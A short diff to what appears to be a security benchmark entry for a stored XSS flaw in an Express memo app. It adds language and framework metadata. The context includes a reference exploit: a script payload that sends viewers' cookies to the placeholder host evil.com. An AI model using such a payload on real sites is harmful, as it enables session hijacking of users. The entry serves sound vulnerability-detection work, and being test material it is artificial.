@@ -22,3 +22,6 @@ exploitable: true
 reference_exploit: "POST /memos with memo=<script>document.location='http://evil.com/?c='+document.cookie</script> steals session cookies of all users viewing memos"
 reference_fix_commit: null
 notes: "Stored XSS affecting all users. Two compounding issues: marked() sanitize option is deprecated/unreliable, AND Swig autoescape is globally disabled. Inter-procedural: route -> DAO -> template rendering."
+language: javascript
+framework: express
+taint_step_count: 5
